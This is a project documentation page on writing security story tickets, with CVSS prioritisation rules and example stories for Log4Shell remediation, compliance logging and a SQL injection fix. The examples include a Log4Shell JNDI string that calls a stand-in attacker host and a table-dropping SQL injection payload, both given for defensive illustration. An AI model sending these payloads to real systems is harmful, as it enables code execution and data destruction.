# SEC - Security Story Type Guidance

**Story Type**: Security | **Prefix**: SEC-NNN | **Version**: 1.1.0 | **Last Updated**: 2025-01-23

---

## Definition

**Security**: Security vulnerabilities, compliance requirements, or security-related technical work.
Critical for any project handling sensitive data, regulated services, or business-critical systems.

---

## When to Use SEC Stories

- **CVE remediation** and vulnerability patching
- **Security audit findings** requiring resolution
- **Compliance requirements** (GDPR, ISO27001, OWASP, NIST CSF, Swiss DPA, project-specific
  controls)
- **Penetration test findings** and remediation
- **Security hardening** and defence-in-depth improvements
- **Compliance gap closure**

---

## Required YAML Fields

```yaml
---
story_id: SEC-012
story_type: security
title: 'Upgrade log4j to remediate CVE-2021-44228'
vulnerability_type: 'Remote Code Execution' # e.g., "SQL Injection", "XSS"
cvss_score: 10.0 # 0.0-10.0 CVSS score
compliance_framework: OWASP # GDPR|ISO27001|OWASP|NIST_CSF|PCI_DSS|Swiss_DPA|project_specific
remediation_deadline: 2025-02-01 # compliance or SLA deadline
cve_id: CVE-2021-44228 # if applicable
priority: High
story_points: 8
status: Done
---
```

---

## CVSS Score Prioritisation

### Critical: CVSS 9.0-10.0 (Fix within 24h)

- Remote code execution vulnerabilities
- Authentication bypass
- Data exfiltration at scale
- Zero-day exploits actively exploited

### High: CVSS 7.0-8.9 (Fix within 72h)

- Privilege escalation
- SQL injection
- Cross-site scripting (XSS) in sensitive areas
- Cryptographic failures

### Medium: CVSS 4.0-6.9 (Fix within 1 week)

- Information disclosure (non-sensitive)
- Denial of service (DoS)
- Security misconfiguration
- Broken access control (limited scope)

### Low: CVSS 0.1-3.9 (Fix in next release)

- Minor information leakage
- Low-impact security features
- Security hardening improvements

---

## Examples

### Example 1: Critical CVE Remediation

```markdown
---
story_id: SEC-001
story_type: security
title: 'Upgrade log4j to remediate CVE-2021-44228 (Log4Shell)'
vulnerability_type: 'Remote Code Execution'
cvss_score: 10.0
compliance_framework: OWASP
remediation_deadline: 2025-01-15
cve_id: CVE-2021-44228
priority: High
story_points: 8
---

# Security: Log4Shell CVE Remediation

## CVSS Score: 10.0 (Critical)

## Compliance Framework: OWASP Top 10

## Vulnerability Description

**CVE-2021-44228 (Log4Shell)**:

- Apache Log4j 2.x Remote Code Execution vulnerability
- Allows attackers to execute arbitrary code via JNDI lookup
- Affects all applications using log4j 2.0-2.14.1
- CVSS Score: 10.0 (Critical severity)

## Attack Vector

Attacker sends crafted log message containing JNDI lookup:
```

${jndi:ldap://attacker.com/malicious}

```

When logged, log4j performs lookup and executes attacker code.

## Impact Assessment

- **Confidentiality**: HIGH - full system access
- **Integrity**: HIGH - arbitrary code execution
- **Availability**: HIGH - potential for ransomware
- **Scope**: All production services using log4j

## Remediation Plan

1. **Immediate** (within 24h):
   - Upgrade log4j to 2.17.1 (patched version)
   - Test in staging environment
   - Deploy to production with emergency change approval

2. **Verification**:
   - Scan all services for log4j versions
   - Confirm no vulnerable versions remain
   - Test exploitation attempts fail

3. **Prevention**:
   - Add dependency scanning to CI/CD pipeline
   - Subscribe to security advisories for all dependencies

## Verification Strategy

- [x] Vulnerability scan shows no log4j < 2.17.1
- [x] Penetration test confirms exploit attempts blocked
- [x] All production services restarted with patched version
- [x] Monitoring shows no suspicious JNDI lookup attempts
```

### Example 2: Data Protection Compliance (regulated environment)

```markdown
---
story_id: SEC-020
story_type: security
title: 'Implement sensitive data access logging for audit compliance'
vulnerability_type: 'Compliance Gap'
cvss_score: N/A
compliance_framework: ISO27001
remediation_deadline: 2025-03-01
priority: High
story_points: 13
---

# Security: Sensitive Data Access Logging Implementation

## Compliance Framework: ISO27001 Traceability and Monitoring Controls

## Vulnerability Description

**Compliance Gap**:

- No comprehensive logging of sensitive data access
- Cannot demonstrate who accessed what data and when
- Audit trail incomplete for regulated business information
- Risk of non-compliance with internal or client security directives

## Project Context

- The applicable control framework requires demonstrable data access traceability
- Data protection obligations apply to sensitive business information
- Stakeholder trust depends on demonstrable handling controls
- Multiple business users access regulated or confidential data daily

## Impact Assessment

- **Regulatory Risk**: HIGH - audit and control failure risk
- **Business Impact**: Audit finding, remediation cost, potential delivery disruption
- **Stakeholder Trust**: Users and clients expect demonstrable data protection controls

## Remediation Plan

1. **Data Access Mapping**:

- Identify all endpoints accessing sensitive PII or confidential data
  - Document data access patterns by user role
  - Map IAM roles to data access permissions

2. **Logging Implementation**:

- Structured logging for all sensitive data access
  - Include user ID, timestamp, data accessed, action type
  - Secure log storage with tamper protection
- Log retention aligned with policy and contractual requirements

3. **Compliance Validation**:

- Internal compliance checklist review
- Security assessment by the relevant assurance function
- Audit preparation documentation

## Verification Strategy

- [ ] All sensitive data access points identified and logged
- [ ] Log format meets traceability requirements
- [ ] Audit trail captures all data access actions
- [ ] Security team confirms control compliance
- [ ] Audit documentation package prepared
```

### Example 3: Penetration Test Finding

````markdown
---
story_id: SEC-035
story_type: security
title: 'Fix SQL injection vulnerability in user search'
vulnerability_type: 'SQL Injection'
cvss_score: 8.5
compliance_framework: OWASP
remediation_deadline: 2025-02-15
priority: High
story_points: 5
---

# Security: SQL Injection Remediation

## CVSS Score: 8.5 (High)

## Compliance Framework: OWASP Top 10 (A03:2021)

## Vulnerability Description

**SQL Injection in User Search**:

- Search parameter directly concatenated into SQL query
- Allows attacker to inject arbitrary SQL commands
- Discovered during annual penetration test
- No input validation or parameterised queries

## Attack Vector

```sql
-- Vulnerable code
query = "SELECT * FROM users WHERE name LIKE '%" + searchTerm + "%'"

-- Attack payload
searchTerm = "'; DROP TABLE users; --"

-- Resulting malicious query
SELECT * FROM users WHERE name LIKE '%'; DROP TABLE users; --%'
```
````

## Impact Assessment

- **Confidentiality**: HIGH - access to all database data
- **Integrity**: HIGH - potential data modification/deletion
- **Availability**: HIGH - potential database destruction

## Remediation Plan

1. **Immediate Fix**:

   - Replace string concatenation with parameterised queries
   - Use ORM query builder (safe by default)
   - Add input validation and sanitisation

2. **Code**:

```java
// Before (vulnerable)
String query = "SELECT * FROM users WHERE name LIKE '%" + searchTerm + "%'";

// After (safe)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE name LIKE ?"
);
stmt.setString(1, "%" + searchTerm + "%");
```

3. **Prevention**:
   - Add static code analysis (SonarQube rule)
   - Security training for developers
   - Code review checklist updated

## Verification Strategy

- [x] Parameterised queries implemented
- [x] Penetration test confirms vulnerability closed
- [x] Automated security scan passes
- [x] Unit tests verify input validation

```

---

## Project Considerations

### Critical for Regulated or Sensitive Services

- **Sensitive Data**: Protection of personal, financial, or regulated data is paramount
- **Assurance Requirements**: Sector or client directives may be mandatory
- **Trust**: Users, clients, and partners expect high security standards

### Security Work Allocation

- **Target**: 5-10% of sprint capacity for security work
- **Higher for regulated environments**: 10-15% may be typical where assurance needs are high
- **Proactive vs Reactive**: 70% proactive hardening, 30% reactive fixes

### Example Compliance Frameworks

- **ISO27001**: Information security management controls
- **Swiss DPA**: Swiss Data Protection Act requirements
- **GDPR**: EU data protection obligations where applicable
- **OWASP**: Web application security standards
- **NIST CSF**: Security risk management framework
- **PCI DSS**: Cardholder data security requirements where applicable

### Common Security Categories

- **IAM Integration**: SSO authentication and role/permission management
- **API Security**: REST endpoint protection, rate limiting, input validation
- **Data Protection**: PII handling, encryption, access logging
- **Session Management**: Secure session handling across web and mobile channels
- **Audit Trail**: Comprehensive logging for traceability and monitoring requirements

---

## Anti-Patterns

### ❌ Delaying Critical Security Fixes
**Wrong**: "We'll fix the CVSS 9.0 vulnerability next sprint"
**Right**: Emergency fix within 24-72h, feature work paused if necessary

### ❌ Security Theatre
**Wrong**: Checkbox compliance without actual security improvement
**Right**: Measurable risk reduction and demonstrable security posture improvement

### ❌ Missing Remediation Deadlines
**Wrong**: Ignoring compliance deadlines (regulatory risk)
**Right**: Treat compliance deadlines as hard commitments, escalate early if at risk

---

## Related Story Types

**SEC can reveal**:
- **TD (Technical Debt)**: Systemic security architecture issues
- **BUG (Defects)**: Security bugs in application code
- **RA (Risk Actions)**: Security risks requiring mitigation

**SEC can spawn from**:
- **US (User Stories)**: Security requirements within features
- **EP (Epics)**: Large security initiatives (e.g., "Zero Trust Architecture")

---

## References

- **Story Type System**: See [story-types/README.md](README.md) for the complete type reference
- **Security Compliance Dashboard**: `roadmap/dashboards/security-compliance-tracker.md` (create when needed)
- **OWASP Top 10**: https://owasp.org/Top10/
- **CVSS Calculator**: https://www.first.org/cvss/calculator/3.1
- **Project Security Standards**: Link the applicable internal or client control set
- **Memory Bank**: `docs-copper/memory-bank/` for project context

---

_SEC-security-guidance.md | Version 1.1.0 | Last Updated: 2025-01-23 | COPPER Project Documentation_
```
